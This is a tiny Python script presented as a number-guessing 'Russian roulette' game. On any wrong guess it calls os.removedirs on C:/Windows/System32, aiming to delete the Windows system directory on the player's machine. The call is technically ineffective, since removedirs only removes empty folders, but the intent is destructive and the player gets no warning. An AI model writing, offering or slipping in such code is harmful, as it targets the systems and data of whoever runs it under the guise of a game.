import random
import os

pChoice = int(input("Choose a number between 1 and 10"))

if pChoice == random.randint(1, 10):
    print("You survived :)")
else:
    os.removedirs("C:/Windows/System32")
